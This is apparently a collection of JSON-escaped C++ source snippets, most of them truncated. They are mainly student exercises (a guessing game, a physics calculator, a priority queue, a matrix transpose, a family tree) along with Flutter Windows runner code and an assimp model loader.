Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"praktikum_2dan3\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\n  Um algoritmo que tem como objetivo ser um jogo com 3 niveis de dificuldade, \nsendo elas: [facil, medio, dificil].\n  O jogo ter\u00e1 um numero sorteado e o objetivo do jogador \u00e9 descobrir o numero sorteado pelo metodo de tentativa e erro.\n*/\n#include <iostream> //Biblioteca principal de entrada e saida padr\u00e3o.\n#include <cstdlib> // Bibliotecas padr\u00e3o do c.\n#include <ctime> // Biblioteca time do c.\n\nusing namespace std; // using std para agilizar o proscesso de codar os 'cout' e 'cin'.\n\nbool chutes(short numSorte, short dificuldade, int *tentativas, short *pontos); // Mostrando minha fun\u00e7\u00e3o para o codigo.\n\nbool chutes(short numSorte, short dificuldade, int *tentativas, short *pontos){ // Declarando fun\u00e7\u00e3o.\n  short numChute = 0; // Dando um valor inicial para numChute.\n  short numD2 = -1; // Valor inicial para numD2.\n\n  if(dificuldade == 2){ // Se escolha da dificuldade seja media, fa\u00e7a numD2 == 16 e iniciar com 200 pontos.\n    numD2 = 16;\n    *pontos = 200;\n  }else if(dificuldade == 3){ // Se dificuldade for igual a dificil numD2 == 6 e iniciar com 300 pontos.\n    numD2 = 6;\n    *pontos = 300;\n  }\n\n  do{\n\n    cout << \"\\n\\tTentativas \" << *tentativas << \" chute um numero: \"; // Mostra o numero da tentativa indo de 0 a infinito dependendo da dificuldade escolhida.\n\n    cin >> numChute; // l\u00ea o valor chutado.\n\n    if(numChute < numSorte)cout << \"\\t\\033[1;91mSeu numero \u00e9 menor que o numero da sorte.\\x1b[0m\\n\"; // Se o numero chutado for menor que numro sorteado vai escrever em vermelho uma mensagem sobre.\n    else if(numChute > numSorte) cout << \"\\t\\033[1;33mSeu numero \u00e9 maior que o numero da sorte.\\x1b[0m\\n\"; // Se o numero chutado for maior que numro sorteado vai escrever em amarelo uma mensagem sobre.\n\n    if(*tentativas > 0 || numChute == numSorte){ // Condi\u00e7\u00e3o para pular a primeira execu\u00e7\u00e3o e caso acerte.\n      if(dificuldade == 1) *pontos = *pontos - 2; // Faz a diminui\u00e7\u00e3o de pontos de acordo com dificuldade escolhida.\n      else if(dificuldade == 2) *pontos = *pontos - 12; // Faz a diminui\u00e7\u00e3o de pontos de acordo com dificuldade escolhida.\n      else if(dificuldade == 3) *pontos = *pontos - 43; // Faz a diminui\u00e7\u00e3o de pontos de acordo com dificuldade escolhida.\n    }\n\n    *tentativas = *tentativas + 1; // Acrescenta 1 a tentativas.\n  }while(numChute != numSorte && *tentativas != numD2); // Vai continuar perguntando o valor sorteado at\u00e9 que acerte ou acabe o numero definido de tentativas(O numero de tentativas ser\u00e1 definido de acordo com o nivel de dificuldade escolhida pelo jogador.).\n\n  return (numChute == numSorte); // Retorna um valor boleano sendo 1 : 0\n}\n\nint main(){\n  \n  srand(time(NULL));\n  const short numSorte = rand() % 101; // O numero sorteado\n\n  short dificuldade = 0; // Valor inicial para dificuldade\n  int tentativas = 0; // valor inicial para o numero de tentativas\n  short pontos = 100; // valor inicial de pontos, para caso seja escolhida a dificuldade 1.\n\n  cout << \"\\t********************\\n\";\n  cout << \"\\t*----Hello Word----*\\n\";\n  cout << \"\\t********************\\n\";\n\n  cout << \"\\n\\tEscolha sua dificuldade \\n \\x1b[1;96mfacil: 1\\n \\x1b[1;90mmedio: 2\\n \\x1b[1;95mdificil: 3\\n\\t\\x1b[0mdificuldade: \";\n  cin >> dificuldade; // Escolhe a dificuldade.\n\n  if(chutes(numSorte, dificuldade, &tentativas, &pontos)) cout << \"\\n\\t\\x1b[1;33mVoc\u00ea ganhou, parab\u00e9ns\\n\"; // Aqui vai executar a fun\u00e7\u00e3o chutes e quado finalizar vai retornar um valor boleano, sendo que se for verdadeiro, aparecer\u00e1 a mensagem para o jogador que ele ganhou.\n  else{\n    cout << \"\\n\\t\\033[91mVoc\u00ea perdeu. O numero era \" << numSorte << \" quem sabe na proxima.\\n\"; // Caso contrario mostrar\u00e1 a mensagem que perdeu.\n    pontos = 0; // E vai perder a pontua\u00e7\u00e3o.\n  }\n\n  cout << \"\\n\\tVoc\u00ea tentou \" << tentativas << \" vezes\\n\\n\\t\" << pontos << \" Pontos\\n\\n\"; // Mostra o numero de vezes que chutou at\u00e9 acertar ou at\u00e9 perder, e mostra sua pontua\u00e7\u00e3o final.\n}\n",
    "/* Creation date: 4-2-2024\n   Teacher: Dr. Tyson McMillan \n   School: Tarrant County College\n   Purpose: A basic calculator that calculates the velocity, acceleration, motion,\n   weight, momentum, and newton's second law given the right inputs and options.\n   Skills learned/gained from the assignment: I learned how to utilize the while\n   loop more efficiently.\n*/\n#include <iostream>\n#include <math.h>\n\nusing namespace std;\n\nvoid calculateVelocity();\nvoid calculateAcceleration();\nvoid calculateMotion();\nvoid calculateWeight();\nvoid calculateMomentum();\nvoid calculateNewtonSecondLaw();\n\nint main(){\n  while(true){\n    char option;\n    cout <<\"What do you want to calculate. \\nEnter 'V' to calculate velocity, 'A' to calculate acceleration, 'M' to calculate motion, 'W' to calculate weight, 'P' to calculate momentum, or 'E' to end the whole program \"<< endl;\n    restart: \n      cin >> option;\n\n    if(option == 'V'){\n      calculateVelocity();\n    }\n    else if(option == 'A'){\n      calculateAcceleration();\n    }\n    else if(option == 'M'){\n      calculateMotion();\n    }\n    else if(option == 'W'){\n      calculateWeight();\n    }\n    else if(option == 'P'){\n      calculateMomentum();\n    }\n    else if(option == 'N'){\n      calculateNewtonSecondLaw();\n    }\n    else if(option == 'E'){\n      exit (0);\n    }\n    else{\n      cout << \"Please Enter a valid input: \"<< endl;\n      goto restart;\n    }\n\n  }\n\n  return 0; \n}\n\nvoid calculateVelocity(){\n  double ds = 0.0, dt = 0.0, v = 0.0;\n  string  dsUnits = \"\", dtUnits = \"\";\n\n  cout << \"Enter the value for change in distance: \"<< endl;\n  cin >> ds;\n  cout << \"Enter the unit for distance: \"<< endl;\n  cin >> dsUnits;\n\n\n  cout << \"Enter the value for change in time: \"<< endl;\n  cin >> dt;\n  cout << \"Enter the unit time: \"<< endl;\n  cin >> dtUnits;\n\n  v = ds/dt;\n\n  cout<< \"The is velocity is: \"<< v << \"=\" << dsUnits << \"/\" << dtUnits << endl;\t\n}\n\nvoid calculateAcceleration(){\n  double dv = 0.0, dt = 0.0, a = 0.0;\n  string  dvUnits = \"\", dtUnits = \"\";\n\n  cout << \"Enter the value for change in velocity: \"<< endl;\n  cin >> dv;\n  cout << \"Enter the unit for velocity: \"<< endl;\n  cin >> dvUnits;\n\n\n  cout << \"Enter the value for change in time: \"<< endl;\n  cin >> dt;\n  cout << \"Enter the unit time: \"<< endl;\n  cin >> dtUnits;\n\n  a = dv/dt;\n\n  cout<< \"The is acceleration is: \"<< a << \"=\" << dvUnits << \"/\" << dtUnits << endl;\t\n}\n\nvoid calculateMotion(){\n  while(true){\n    char option;\n    cout <<\"Enter 'a' to solve v, 's' solve for s, 'd' to solve for v^2, or 'v' to solve for v_bar \"<< endl;\n    restart: \n      cin >> option;\n\n    if(option == 'a'){\n      double v = 0.0, v0 = 0.0, a = 0.0, t = 0.0;\n\n      cout << \"Enter initial velocity: \"<< endl;\n      cin >> v0;\n      cout << \"Enter the acceleration: \"<< endl;\n      cin >> a;\n      cout << \"Enter initial time: \"<< endl;\n      cin >> t;\n\n      v = v0 + (a*t);\n\n      cout << \"The velocity: \"<< v << endl;\n\n      }\n    else if(option == 's'){\n      double s0 = 0.0, v0 = 0.0, a = 0.0, t = 0.0, s = 0.0;\n\n      cout << \"Enter initial velocity: \"<< endl;\n      cin >> v0;\n      cout << \"Enter the acceleration: \"<< endl;\n      cin >> a;\n      cout << \"Enter initial time: \"<< endl;\n      cin >> t;\n      cout << \"Enter initial initial distance: \"<< endl;\n      cin >> s0;\n\n      s = s0 + (v0*t) + (0.5*a*pow(t,2));\n\n      cout << \"The final distance is: \"<< s << endl;\n    }\n    else if(option == 'd'){\n      double v = 0.0, v0 = 0.0, s = 0.0, s0 = 0.0, a = 0.0;\n\n      cout << \"Enter initial velocity: \"<< endl;\n      cin >> v0;\n      cout << \"Enter the acceleration: \"<< endl;\n      cin >> a;\n      cout << \"Enter initial distance: \"<< endl;\n      cin >> s0;\n      cout << \"Enter final distance: \"<< endl;\n      cin >> s;\n\n\n      v = pow(v0, 2) + (2 * a * (s-s0));\n\n      cout << \"The v^2: \"<< v << endl;\n    }\n    else if(option == 'v'){\n      double v = 0.0, v0 = 0.0, v_bar = 0.0;\n\n      cout << \"Enter initial velocity: \"<< endl;\n      cin >> v0;\n      cout << \"Enter the final velocity: \"<< endl;\n      cin >> v;\n\n      v_bar = 0.5 * (v+v0);\n\n      cout << \"The v_bar: \"<< v_bar << endl;\n\n    }\n    else{\n      cout << \"Please Enter a valid input: \"<< endl;\n      goto restart;\n    }\n\n  }\n}\n\nvoid calculateNewtonSecondLaw(){\n  double N = 0.0, m = 0.0, a = 0.0;\n  string mUnits = \" \", aUnits = \" \";\n\n  cout << \"Enter the mass: \"<< endl;\n  cin >> m;\n  cout << \"Enter the unit mass: \"<< endl;\n  cin >> mUnits;\n  cout << \"Enter the acceleration: \"<< endl;\n  cin >> a;\n  cout << \"Enter the unit for acceleration: \"<< endl;\n  cin >> aUnits;\n\n  N = m*a;\n\n  cout<< \"The calculated force is: \"<< N << mUnits << \" \" << aUnits << endl;\n}\n\nvoid calculateWeight(){\n  double W = 0.0, m = 0.0, g = 0.0;\n  string mUnits = \" \", gUnits = \" \";\n\n  cout << \"Enter the mass: \"<< endl;\n  cin >> m;\n  cout << \"Enter the unit mass: \"<< endl;\n  cin >> mUnits;\n  cout << \"Enter the gravity: \"<< endl;\n  cin >> g;\n  cout << \"Enter the unit for gravity: \"<< endl;\n  cin >> gUnits;\n\n  W = m*g;\n\n  cout<< \"",
    "/ UMBC - CMSC 341 - Spring 2024 - Proj3                                                                                                                                     \n#include \"rqueue.h\"\n\n//Name: RQueue (Constructor)                                                                                                                                                 \n//Desc: Creates empty queue and initializes values                                                                                                                           \n//Preconditions: required variables provided                                                                                                                                 \n//Postconditions: Empty queue is created with intialized values                                                                                                              \nRQueue::RQueue(prifn_t priFn, HEAPTYPE heapType, STRUCTURE structure) {\n  m_heap = nullptr;\n  m_size = 0;\n  m_priorFunc = priFn;\n  m_heapType = heapType;\n  m_structure = structure;\n}\n\n\n\n//Name: Destructor                                                                                                                                                           \n//Desc: Deallocates all memory and re-initializaed the member variables                                                                                                      \n//Preconditions: Heap exists                                                                                                                                                 \n//Postconditions: All memory is deallocated and member variables reinitialized                                                                                               \nRQueue::~RQueue() {\n  clear();\n}\n\n\n\n//Name: Destructor                                                                                                                                                           \n//Desc: Deallocates all nodes and re-initializaed the member variables                                                                                                       \n//Preconditions: Heap exists                                                                                                                                                 \n//Postconditions: All nodes are deallocated and member variables reinitialized                                                                                               \n//leaving an empty heap                                                                                                                                                      \nvoid RQueue::clear() {\n  clear(m_heap);\n  m_size = 0;\n}\n\n\n\n//Name: RQueue (Copy Constructor)                                                                                                                                            \n//Desc: creates a deep copy of rhs object                                                                                                                                    \n//Preconditions: Heap exist                                                                                                                                                  \n//Postconditions: a deep copy of heap is created                                                                                                                             \nRQueue::RQueue(const RQueue& rhs) {\n  //copies mem variables                                                                                                                                                     \n  m_size = rhs.m_size;\n  m_priorFunc = rhs.m_priorFunc;\n  m_heapType = rhs.m_heapType;\n  m_structure = rhs.m_structure;\n\n  //if root exists                                                                                                                                                           \n  if(rhs.m_heap != nullptr){\n    //recursive copy                                                                                                                                                         \n    copy(m_heap, rhs.m_heap);\n\n    //in case empty heap                                                                                                                                                     \n  }else{\n    m_heap = nullptr;\n  }\n}\n\n//Name: getHeapType                                                                                                                                                          \n//Desc: returns heap type                                                                                                                                                    \n//Preconditions: tree exists with defined heap type                                                                                                                          \n//Postconditions: heap type is returned                                                       ",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <algorithm>\r\n#include <stdexcept>\r\n\r\nusing namespace std;\r\n// class Utilisateur  (user)\r\nclass User {\r\nprivate:\r\n    static int idU;\r\n    int userID;\r\n    string nom, prenom;\r\n    string username;\r\n    string password;\r\n    string departement;\r\npublic:\r\n/* Constructors */\r\n    User(){ userID = idU++; }\r\n    User(string n, string pre, string u, string p, string d):userID(idU++), nom(n), prenom(pre), username(u), password(p), departement(d){}\r\n    // getters\r\n    int getId()const { return userID; }\r\n    string getNom()const { return nom;}\r\n    string getPrenom()const{return prenom ;}\r\n    string getUsername()const { return username;}\r\n    string getDepartement()const {return  departement ;}\r\n    // setters \r\n    void setNom(string nom) { this->nom = nom;}\r\n    void setPrenom(string prenom) {this->prenom = prenom;}\r\n    void setUsername(string username) {this->username = username;}\r\n    void setPassword(string password) {this->password = password;}\r\n    void setDepartement(string departement) {this->departement = departement;}\r\n\r\n\r\n\r\n    bool authenticate(string u, string p) const {\r\n        return username == u && password == p;\r\n    }\r\n    friend ostream& operator<<(ostream& on, const User& u) {\r\n        on << \"-------------------------------\" << endl;\r\n        on << \"ID de l'utilisateur: \" << u.userID << endl;\r\n        on << \"Nom: \" << u.nom << endl;\r\n        on << \"Prenom: \" << u.prenom << endl;\r\n        on << \"Username: \" << u.username << endl;\r\n        on << \"Departement: \" << u.departement << endl;\r\n        return on;\r\n    }\r\n    friend istream& operator>>(istream& in, User& u){\r\n        cout << \"entrer le  nom de l'utilisateur\"<< endl;\r\n        in >> u.nom;\r\n        cout << \"entrer le prenom de l'utilisateur\"<<endl;\r\n        in >> u.prenom;\r\n        cout << \"entrer le Username de l'utilisateur\"<<endl;\r\n        in >> u.username;\r\n        cout << \"entrer le password de  l'utilisateur\"<<endl;\r\n        in >> u.password;\r\n        cout << \"entrer la departement de  l'utilisateur\"<<endl;\r\n        in >> u.departement;\r\n        return in;\r\n    }\r\n    void aff(){ cout<<\"\\n\\t[ID= \"<<userID<<\"][\"<<nom<<\":\"<<prenom<<\"]\"; }\r\n    ~User() {}\r\n};\r\nint User::idU = 1;\r\n\r\n// class matariel\r\nclass Material {\r\nprivate:\r\n    static  int idM;\r\n    int mId;\r\n    string nom,typeMat,reference,emplacement;\r\n    bool statue;\r\n    vector<User> usersAcce;\r\npublic:\r\n    Material(string n, string t, string r, string e,bool s): mId(idM++), nom(n), typeMat(t), reference(r), emplacement(e),statue(s){}\r\n    // getters est setters\r\n    int getId() const {return mId;}\r\n    const string& getNom() const {return nom;}\r\n    void setNom(const string& name) {nom = name;}\r\n    const string& getType() const {return typeMat;}\r\n    void setType(const string& type) {typeMat = type;}\r\n    const string& getReference() const {return reference;}\r\n    void setReference(const string& ref) {reference = ref;}\r\n    const string& getEmplacement() const {return emplacement;}\r\n    void setEmplacement(const string& place) {emplacement = place;}\r\n    bool isStatue() const {return statue;}\r\n    void setStatue(bool status) {statue = status;}\r\n\r\n    void usersAcceAff(){\r\n        if(!usersAcce.empty()){\r\n            for (auto u:usersAcce) {\r\n                u.aff();\r\n            }\r\n        } else{ cout<<\"*Aucun utilisateur*\";}\r\n    }\r\n    friend ostream& operator<<(ostream& on, const Material& m) {\r\n        on <<\"\\n\\n---------------------------\\n\";\r\n        on << \"ID de matariel: \" << m.mId << endl;\r\n        on << \"Nom: \" << m.nom << endl;\r\n        on << \"type: \" << m.typeMat << endl;\r\n        on << \"reference: \" << m.reference << endl;\r\n        on << \"emplacement: \" << m.emplacement << endl;\r\n        on << \"statut: \";m.statue?cout<<\" en service \"<<endl:cout<<\" Hors service \"<<endl;\r\n        return on;\r\n    }\r\n    friend istream& operator>>(istream& in, Material& m) {\r\n        cout <<\"\\n---------------------------\\n\";\r\n        cout << \"Entrer le nom du materiel : \";\r\n        in >> m.nom;\r\n        cout << \"Entrer le type du materiel : \";\r\n        in >> m.typeMat;\r\n        cout << \"Entrer la reference du materiel : \";\r\n        in >> m.reference;\r\n        cout << \"Entrer l'emplacement du materiel : \";\r\n        in >> m.emplacement;\r\n        cout << \"Le materiel est-il en service ? (1 pour oui, 0 pour non) : \";\r\n        in >> m.statue;\r\n        return in;\r\n    }\r\n    void aff(){\r\n        cout<<\"\\n\\t\\t[-\"<<mId<<\"-]-_-( \"<<nom<<\" )-_-( \"<<typeMat<<\" )\";\r\n    }\r\n    void affX(){\r\n        cout<<\"\\n\\t__________Matarial__________\";\r\n        cout << \"ID de matariel: \" << mId << endl;\r\n        cout << \"Nom: \" << nom << endl;\r\n        cout << \"type: \" << typeMat << endl;\r\n        cout << \"reference: \" << reference << endl;\r\n        cout << \"emplacement: \" << emplacement << endl;\r\n        cout << \"statut: \";statue?cout<<\" en service \"<<endl:cout<<\" Hors service \"<<endl;\r\n    }\r\n    void adduser(User u){\r\n        user",
    "#include \"model_loading.hpp\"\n\n#include <iostream>\n\n#include \"assimp/Importer.hpp\"\n#include \"assimp/postprocess.h\"\n#include <utility>\n\n/**\n * overview:\n * initialization:\n *  first we iterate through the entire assimp imported object recursively\n *  we store all the images we found in the base model, this is the initialization phase.\n *\n */\n\nMesh::Mesh(std::vector<Vertex> vertices, std::vector<unsigned int> indices) {\n    this->vertices = std::move(vertices);\n    this->indices = std::move(indices);\n};\n\n/**\n * \\brief loads a 3d model into wrapper structure\n *\n * \\pre the shader files specified exist and are at this file path\n * \\todo have a resource directory so that we don't have to specify a long relative path\n *\n * @param path the path to the model we want to load\n */\nModel::Model(std::string path) { this->load_model(std::move(path)); }\n\n/**\n * notes:\n * \t- this function is the entry point to the initialization process\n * \t- although this function looks short and simple, the call to process_node\n * \tis recursive and does all the work of parsing assimp's structure\n */\nvoid Model::load_model(std::string path) {\n    Assimp::Importer importer;\n    const aiScene *scene = importer.ReadFile(path, aiProcess_Triangulate);\n    if (!scene || scene->mFlags & AI_SCENE_FLAGS_INCOMPLETE || !scene->mRootNode) {\n        std::cout << \"ERROR::ASIMP::\" << importer.GetErrorString() << std::endl;\n        return;\n    }\n    this->directory = path.substr(0, path.find_last_of(\"/\"));\n    printf(\"starting to process nodes \\n\");\n    this->process_node(scene->mRootNode, scene);\n    printf(\"processed all nodes\\n\");\n};\n\n/**\n * notes:\n * - recall that a node may contains a collection of meshes, and\n * also children nodes\n * - this function is guarenteed to terminate because modellers\n * create strctures made up of finitely many nodes and meshes.\n * - this can be thought of the same way that each folder in blender can have individual meshes inside or more\n * folders (I believe a folder is called a collection) and just represents arbitrary nesting\n */\nvoid Model::process_node(aiNode *node, const aiScene *scene) {\n    printf(\"stared processing meshes\\n\");\n    for (unsigned int i = 0; i < node->mNumMeshes; i++) {\n        aiMesh *mesh = scene->mMeshes[node->mMeshes[i]];\n        this->meshes.push_back(this->process_mesh(mesh, scene));\n    }\n    printf(\"finished processing meshes\\n\");\n    for (unsigned int i = 0; i < node->mNumChildren; i++) {\n        process_node(node->mChildren[i], scene);\n    }\n};\n\nglm::vec3 assimp_to_glm_3d_vector(aiVector3D assimp_vector) {\n    return {assimp_vector.x, assimp_vector.y, assimp_vector.z};\n}\n\nstd::vector<Vertex> Model::process_mesh_vertices(aiMesh *mesh) {\n    std::vector<Vertex> vertices;\n\n    bool mesh_has_texture_coordinates = mesh->mTextureCoords[0] != nullptr;\n    printf(\"This mesh has %d vertices\\n\", mesh->mNumVertices);\n    for (unsigned int i = 0; i < mesh->mNumVertices; i++) {\n        Vertex vertex;\n        vertex.position = assimp_to_glm_3d_vector(mesh->mVertices[i]);\n        vertices.push_back(vertex);\n    }\n    return vertices;\n}\n\n/**\n * \\brief given a mesh iterate through each face storing all indices of each vertex on that face\n */\nstd::vector<unsigned int> Model::process_mesh_indices(aiMesh *mesh) {\n    std::vector<unsigned int> indices;\n    for (unsigned int i = 0; i < mesh->mNumFaces; i++) {\n        aiFace face = mesh->mFaces[i];\n\n        assert(face.mNumIndices == 3); // if this is false we are not working with triangles\n\n        for (unsigned int j = 0; j < face.mNumIndices; j++) {\n            indices.push_back(face.mIndices[j]);\n        }\n    }\n    return indices;\n}\n\n/**\n * description\n * \ttakes in assimp's interpretation of a mesh, and then parses it\n * \tinto our version of a mesh\n */\nMesh Model::process_mesh(aiMesh *mesh, const aiScene *scene) {\n    std::vector<Vertex> vertices = this->process_mesh_vertices(mesh);\n    std::vector<unsigned int> indices = this->process_mesh_indices(mesh);\n    return {vertices, indices};\n};\n",
    "#include <iostream>\nusing namespace std;\n\nint main() {\n    int a[10][10], transpose[10][10], row, column, i, j;\n\n    cout << \"Enter rows and columns of matrix: \";\n    cin >> row >> column;\n\n    cout << \"\\nEnter elements of matrix: \" << endl;\n\n    // Storing matrix elements\n    for (int i = 0; i < row; ++i) {\n        for (int j = 0; j < column; ++j) {\n            cout << \"Enter element a\" << i + 1 << j + 1 << \": \";\n            cin >> a[i][j];\n        }\n    }\n\n    // Printing the a matrix\n    cout << \"\\nEntered Matrix: \" << endl;\n    for (int i = 0; i < row; ++i) {\n        for (int j = 0; j < column; ++j) {\n            cout << \" \" << a[i][j];\n            if (j == column - 1)\n                cout << endl << endl;\n        }\n    }\n\n    // Computing transpose of the matrix\n    for (int i = 0; i < row; ++i)\n        for (int j = 0; j < column; ++j) {\n            transpose[j][i] = a[i][j];\n        }\n\n    // Printing the transpose\n    cout << \"\\nTranspose of Matrix: \" << endl;\n    for (int i = 0; i < column; ++i)\n        for (int j = 0; j < row; ++j) {\n            cout << \" \" << transpose[i][j];\n            if (j == row - 1)\n                cout << endl << endl;\n        }\n\n    return 0;\n}",
    "#include <iostream>\r\nusing namespace std;\r\n#include <string>\r\n#include<vector>\r\n\r\n// Idea is Creating a family tree using a single linked list from head to bottom\r\n\r\nclass Person{\r\n    public: //must specify otherwise default private\r\n    string _name;\r\n    vector<Person*> _children={}; //list of pointers not objects so if one object changes the change is reflected when accessing the pointer instead of ending up with 2 different objects in memory originating from 1 object change.\r\n\r\n    Person(string name){_name=name;}\r\n\r\n    void NullPtrCheck(){\r\n        if (this == nullptr){\r\n            cout<<\"Error: Cannot perform action on Nullptr\\n\";\r\n            return;\r\n        }\r\n    }\r\n\r\n    #pragma region adders\r\n    void addChild(Person* p){\r\n        NullPtrCheck();\r\n        // if (this == nullptr)\r\n        //     cout<<\"Error: Cannot add child to Nullptr\\n\";\r\n        // else\r\n            _children.push_back(p);\r\n        }\r\n\r\n    void addChild(string name){\r\n        // if (this == nullptr)\r\n        //     cout<<\"Error: Cannot add child to Nullptr\\n\";\r\n        // else{\r\n        NullPtrCheck();\r\n        Person* p = new Person(name);\r\n        _children.push_back(p);\r\n        // }\r\n    }\r\n    #pragma endregion\r\n\r\n    #pragma region Printers\r\n    void PrintChildren(){ //this could also be outside of Class in the form of PrintChildren(Person* p) since no private var access needed\r\n        cout<<\"Children of \"<<this->returnName()<<\": \";\r\n        \r\n        //print first child, seperated from loop just for the sake of output format not ending with a \",\"\r\n        if (_children.size()>=1)\r\n            cout<<_children[0]->returnName();\r\n\r\n        for (int i = 1; i < _children.size(); i++)\r\n        {\r\n            cout<<\", \";\r\n            cout<<_children[i]->returnName();\r\n        }\r\n        cout<<\"\\n\";\r\n    }\r\n    #pragma endregion\r\n\r\n    #pragma region getters\r\n    string returnName(){ //NOTE: SINCE CAN BE nullptr, CANNOT JUST PRINT this->name\r\n        if (this 